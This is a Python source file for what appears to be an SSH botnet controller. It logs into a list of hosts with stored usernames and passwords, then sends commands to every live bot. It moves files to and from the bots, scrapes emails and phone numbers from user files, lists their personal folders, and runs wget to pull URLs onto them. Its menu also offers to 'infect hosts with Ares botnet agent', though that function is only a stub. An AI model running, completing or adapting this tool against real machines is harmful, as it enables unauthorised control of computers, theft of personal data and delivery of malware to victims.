import paramiko
import socket
from tabulate import tabulate

class Bot():
    def __init__(self, id, host, user, passw):
        self.id = id
        self.host = host
        self.user = user.strip('"')  # Ensure no stray quotes
        self.passw = passw
        self.status_up = False
        self.error = None

    def updateStatus(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(hostname=self.host, username=self.user, password=self.passw, timeout=10)
            stdin, stdout, stderr = ssh.exec_command("uptime -p")
            ret = stdout.read().decode(encoding='UTF-8')
            self.status_up = True
        except Exception as e:
            self.status_up = False
            self.error = str(e)
        finally:
            ssh.close()  
        return self.status_up

def get_bots(path):
    bots = []
    i = 0
    for line in open(path, 'r').readlines():
        h, passw = line.split()
        user, host = h.split('@')
        bots.append(Bot(i, host, user, passw))
        i += 1
    return bots

def getStatus(bots):
    headers = ["Bot ID", "Host", "User", "IP Address", "Status", "Error"]
    bots_table = []
    for bot in bots:
        up = bot.updateStatus()
        ip_address = socket.gethostbyname(bot.host)
        if up:
            bots_table.append([bot.id, bot.host, bot.user, ip_address, "\033[92mUP\033[0m", ""])
        else:
            bots_table.append([bot.id, bot.host, bot.user, ip_address, "\033[91mDOWN\033[0m", bot.error])
    print(tabulate(bots_table, headers))

def executeCmd(bots, cmd):
    for bot in bots:
        if bot.status_up:
            print(f"Executing on Bot [{bot.id}]: {bot.host}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=bot.host, username=bot.user, password=bot.passw, timeout=10)
                stdin, stdout, stderr = ssh.exec_command(cmd)
                ret = stdout.read().decode(encoding='UTF-8')
                print(ret)
            except Exception as e:
                print(f"Bot [{bot.id}] failed to execute command: {e}")
            finally:
                ssh.close()

def downloadFile(bots, remote_path, local_path):
    for bot in bots:
        if bot.status_up:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=bot.host, username=bot.user, password=bot.passw, timeout=10)
                sftp = ssh.open_sftp()
                print(f"Downloading file from Bot [{bot.id}]...")
                sftp.get(remote_path, local_path)
                print(f"File downloaded to {local_path}")
                sftp.close()
            except Exception as e:
                print(f"Bot [{bot.id}] failed to download file: {e}")
            finally:
                ssh.close()

def uploadFile(bots, local_path, remote_path):
    for bot in bots:
        if bot.status_up:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=bot.host, username=bot.user, password=bot.passw, timeout=10)
                sftp = ssh.open_sftp()
                print(f"Uploading file to Bot [{bot.id}]...")
                sftp.put(local_path, remote_path)
                print(f"File uploaded to {remote_path}")
                sftp.close()
            except Exception as e:
                print(f"Bot [{bot.id}] failed to upload file: {e}")
            finally:
                ssh.close()

def listDir(bots, remote_dir):
    for bot in bots:
        if bot.status_up:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=bot.host, username=bot.user, password=bot.passw, timeout=10)
                stdin, stdout, stderr = ssh.exec_command(f"ls -R {remote_dir}")
                ret = stdout.read().decode(encoding='UTF-8')
                print(f"Directory listing on Bot [{bot.id}]:\n{ret}")
            except Exception as e:
                print(f"Bot [{bot.id}] failed to list directory: {e}")
            finally:
                ssh.close()

def fetchSystemInfo(bots):
    for bot in bots:
        if bot.status_up:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=bot.host, username=bot.user, password=bot.passw, timeout=10)

                stdin, stdout, stderr = ssh.exec_command("whoami")
                user = stdout.read().decode(encoding='UTF-8').strip()

                stdin, stdout, stderr = ssh.exec_command("hostname")
                hostname = stdout.read().decode(encoding='UTF-8').strip()

                ip_address = socket.gethostbyname(bot.host)

                home_directory = f"/home/{user}"
                documents_directory = f"/home/{user}/Documents"
                downloads_directory = f"/home/{user}/Downloads"
                pictures_directory = f"/home/{user}/Pictures"

                paths = {
                    "Home Directory": home_directory,
                    "Documents": documents_directory,
                    "Downloads": downloads_directory,
                    "Pictures": pictures_directory
                }

                email_cmds = [
                    "grep -oP '[\\w\\.-]+@[\\w\\.-]+' /etc/passwd",
                    "grep -oP '[\\w\\.-]+@[\\w\\.-]+' ~/.gitconfig"
                ]
                emails = []
                for cmd in email_cmds:
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    email_output = stdout.read().decode(encoding='UTF-8').strip().split('\n')
                    emails.extend(email_output)

                phone_cmd = "grep -oP '\\b\\d{10}\\b' ~/.contact"
                stdin, stdout, stderr = ssh.exec_command(phone_cmd)
                phone_numbers = stdout.read().decode(encoding='UTF-8').strip().split('\n')

                info_table = [
                    ["User", user],
                    ["Hostname", hostname],
                    ["IP Address", ip_address],
                    ["Emails", ', '.join(set(emails)) or 'None'],
                    ["Phone Numbers", ', '.join(set(phone_numbers)) or 'None']
                ]

                print(f"System Info for Bot [{bot.id}]:")
                print(tabulate(info_table, headers=["Info", "Details"]))
                print("\nDirectory Listings:")

                for name, path in paths.items():
                    print(f"\nContents of {name} ({path}):")
                    stdin, stdout, stderr = ssh.exec_command(f"ls -1 {path}")
                    contents = stdout.read().decode(encoding='UTF-8').strip().split('\n')
                    if contents:
                        for item in contents:
                            print(f"{path}/{item}")
                    else:
                        print("No contents found.")

            except Exception as e:
                print(f"Bot [{bot.id}] failed to fetch system info: {e}")
            finally:
                ssh.close()

def openUrl(bots, url, download_dir):
    for bot in bots:
        if bot.status_up:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=bot.host, username=bot.user, password=bot.passw, timeout=10)
                stdin, stdout, stderr = ssh.exec_command(f"wget {url} -P {download_dir}")
                print(stdout.read().decode())
            except Exception as e:
                print(f"Bot [{bot.id}] failed to download URL: {e}")
            finally:
                ssh.close()

def printHelp():
    print("\nCommands:")
    commands_table = [
        ["cmd", "execute command to all UP bots"],
        ["rescan", "rescan for hosts status"],
        ["Ares", "infect hosts with Ares botnet agent"],
        ["download", "download a file from bots"],
        ["upload", "upload a file to bots"],
        ["dir", "list directory contents on bots"],
        ["view", "view file contents on bots"],
        ["info", "display system info (user, IP, directories)"],
        ["url", "download content from URL on bots"],
        ["help", "print this"],
        ["exit", "exit program"]
    ]
    print(tabulate(commands_table, tablefmt="jira") + "\n")

if __name__ == "__main__":
    print('\n                  888             888               888    ')
    print('                  888             888               888    ')
    print('                  888             888               888    ')
    print('\033[95m.d8888b  .d8888b  88888b.         88888b.   .d88b.  888888 \033[0m')
    print('88K      88K      888 "88b        888 "88b d88""88b 888')
    print('\033[91m"Y8888b. "Y8888b. 888  888 888888 888  888 888  888 888 \033[0m   ')
    print('     X88      X88 888  888        888 d88P Y88..88P Y88b.  ')
    print(' 88888P´  88888P´ 888  888        88888P"   "Y88P"   "Y888 \n\n\n')

    bots = get_bots("bots.txt")

    getStatus(bots)
    printHelp()

    while True:
        cmd = input("> ")

        if cmd == "exit":
            exit(0)

        elif cmd == "rescan":
            getStatus(bots)

        elif cmd == "Ares":
            # Note: The function infectAres is not defined in the given code.
            pass  # Replace with the actual function call if available

        elif cmd == "cmd":
            cmd = input("> Type your command: ")
            executeCmd(bots, cmd)

        elif cmd == "download":
            remote_path = input("> Enter the remote file path: ")
            local_path = input("> Enter the local path to save: ")
            downloadFile(bots, remote_path, local_path)

        elif cmd == "upload":
            local_path = input("> Enter the local file path: ")
            remote_path = input("> Enter the remote file path to save: ")
            uploadFile(bots, local_path, remote_path)

        elif cmd == "dir":
            remote_dir = input("> Enter the remote directory path: ")
            listDir(bots, remote_dir)

        elif cmd == "view":
            remote_file = input("> Enter the file path to view: ")
            # Note: The function viewFile is not defined in the given code.
            pass  # Replace with the actual function call if available

        elif cmd == "info":
            fetchSystemInfo(bots)

        elif cmd == "url":
            url = input("> Enter the URL to download: ")
            download_dir = input("> Enter the remote directory to save: ")
            openUrl(bots, url, download_dir)

        elif cmd == "help":
            printHelp()

        else:
            print("Command not found")
